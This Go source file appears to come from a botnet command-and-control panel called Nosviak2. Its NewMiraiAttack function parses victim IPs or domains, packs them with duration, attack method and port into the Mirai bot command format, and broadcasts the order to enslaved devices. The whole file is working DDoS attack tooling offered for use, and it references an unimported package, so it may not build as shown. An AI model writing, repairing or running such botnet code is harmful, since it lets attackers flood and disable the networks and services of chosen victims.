package attacks

import (
	"Nosviak2/core/clients/sessions"
	"Nosviak2/core/configs"
	"Nosviak2/core/slaves/mirai"
	"Nosviak2/core/sources/language"
	"encoding/binary"
	"errors"
	"net"
	"strconv"
	"strings"
)

//properly tries to launch the mirai attack
//this will broadcast the information within the network without issues
func NewMiraiAttack(target string, duration int, port int, method *Method, session *sessions.Session, flags map[string]*KeyValue) (bool, error) {

	//stores all of our targets safely
	//this will ensure its done without any errors
	var targets map[uint32]uint8 = make(map[uint32]uint8)

	//tries to parse the target information
	//this will be used within the attack schema without issues
	for pos, target := range strings.Split(target, ",") { //ranges through properly

		//renders the system error
		//this will ensure its done without any errors
		if pos > 255 { //stores the position properly, this will render the error without any errors happening
			if session == nil { //detects if we are funneling through an api tunnel
				return false, errors.New("you have provided too many targets within you're attack reqeust")
			} //renders onto the session properly without issues happening
			return false, language.ExecuteLanguage([]string{"attacks", "mirai", "too-many-targets.itl"}, session.Channel, deployment.Engine, session, make(map[string]string))
		}

		if !ValidateTarget(target) {
			if session == nil { //checks if we are funneling into the api tunnel
				return false, errors.New("you have provided an invalid target within the system")
			} //defaults properly without issues happening
			return false, language.ExecuteLanguage([]string{"attacks", "mirai", "invalid-target.itl"}, session.Channel, deployment.Engine, session, map[string]string{"target":target})
		}

		if IsDomain(target) {
			sysTarg, err := Resolver.LookupHost(target)
			if err != nil {
				if session == nil { //checks if we are funneling into the api tunnel
					return false, errors.New("you have provided an invalid target within the system")
				} //defaults properly without issues happening
				return false, language.ExecuteLanguage([]string{"attacks", "mirai", "invalid-target.itl"}, session.Channel, deployment.Engine, session, map[string]string{"target":target})
			}

			target = string(sysTarg[0].String())
		}


		//tries to parse the target safely
		//this will ensure its done without any errors happening
		ip := net.ParseIP(target) //tries to parse the target without issues
		if ip == nil { //checks to see if it was successful without any errors
			if session == nil { //checks if we are funneling into the api tunnel
				return false, errors.New("you have provided an invalid target within the system")
			} //defaults properly without issues happening
			return false, language.ExecuteLanguage([]string{"attacks", "mirai", "invalid-target.itl"}, session.Channel, deployment.Engine, session, map[string]string{"target":target})
		}

		//saves into the array properly safely
		//this will ensure its done without any errors happening
		targets[binary.BigEndian.Uint32(ip[12:])] = 32
	}


	//stores our proper output without issues
	//this will be what we broadcast via our clients
	Buffer := make([]byte, 0) //our attack output properly
	var cacheBuf []byte //this will act as our temp buffer

	cacheBuf = make([]byte, 4) //duration cache
	//parses and formats the attack duration safely
	//this will be what we run via without errors happening
	binary.BigEndian.PutUint32(cacheBuf, uint32(duration))
	Buffer = append(Buffer, cacheBuf...) //saves into the buffer

	//adds the attack type properly without issues
	//this will ensure its done without any errors happening
	Buffer = append(Buffer, byte(method.MiraiInteface)) //sends the type properly

	//adds the amount of targets properly
	//this will ensure we know about it without issues
	Buffer = append(Buffer, byte(len(targets)))

	//sends all of our attack targets properly
	//this will be what we forward without issues happening
	for prefix, netmask := range targets { //ranges through properly
		//resets the cache properly and safely
		//this will ensure its done without any errors
		cacheBuf = make([]byte, 5) //resets buffer properly
		binary.BigEndian.PutUint32(cacheBuf, prefix) //puts properly
		cacheBuf[4] = byte(netmask) //saves in properly within the netmask
		Buffer = append(Buffer, cacheBuf...) //forwads properly without issues
	}

	//stores our length properly
	//this will ensure its done properly
	var length int = len(flags)

	//checks for the port properly
	//this will ensure its done properly
	if !hasPort(method, flags) { //checks
		length++ //adds an addition
	}

	//sends the amount of flags
	//this will be set to 0 currently as there is no flag support
	Buffer = append(Buffer, byte(length)) //sends 0 flags as we won't added support currently

	var hasPort bool = false
	//ranges through the flags properly
	//this will ensure its done without any errors
	for _, value := range flags { //ranges through properly
		//checks the value properly
		//this will ensure its done properly
		if value.ID == method.MiraiPortInterface {
			hasPort = true //flips properly and safely
		}
		cacheBuf = make([]byte, 2) //sets the buffer properly
		cacheBuf[0] = uint8(value.ID) //flag id information
		cacheBuf[1] = uint8(len(value.Value)) //values value information
		cacheBuf = append(cacheBuf, []byte(value.Value)...) //savesin properly
		Buffer = append(Buffer, cacheBuf...) //saves into the buffer properly
	}

	//checks for the port properly
	if !hasPort { //syncs with port
		//adds support for port system
		//this will ensure its added into the command
		cacheBuf = make([]byte, 2) //sets the buffer properly
		cacheBuf[0] = uint8(method.MiraiPortInterface) //miraiPortID
		cacheBuf[1] = uint8(len(strconv.Itoa(port))) //ports length
		cacheBuf = append(cacheBuf, []byte(strconv.Itoa(port))...)
		Buffer = append(Buffer, cacheBuf...) //saves into the buffer properly
	}

	//checks the length of the buffer properly
	//this will ensure we don't overflow the clients
	if len(Buffer) > 4096 { //checks the length properly
		if session == nil { //sessions properly without issues happening
			return false, errors.New("the buffer has reached an invalid length properly")
		} //renders onto the session properly without issues
		return false, language.ExecuteLanguage([]string{"attacks", "mirai", "buffer-increment.itl"}, session.Channel, deployment.Engine, session, make(map[string]string))
	}

	cacheBuf = make([]byte, 2) //resets properly
	//sends the amount of the buffer properly safely
	//this will ensure its done without any errors happening
	binary.BigEndian.PutUint16(cacheBuf, uint16(len(Buffer) + 2))
	Buffer = append(cacheBuf, Buffer...) //adds into the main array properly

	//broadcasts the command across all slaves
	//this will ensure its done without any errors
	return true, mirai.Send(Buffer, session) //broadcasts properly
}

//checks if the flags contain the dport flag or the method flag
func hasPort(m *Method, flags map[string]*KeyValue) bool { //boolean returned
	//ranges through the flags properly
	//this will ensure its done properly
	for _, flag := range flags { //ranges through
		if flag.ID == m.MiraiPortInterface { //checks
			return true //returns true properly
		}
	}; return false
}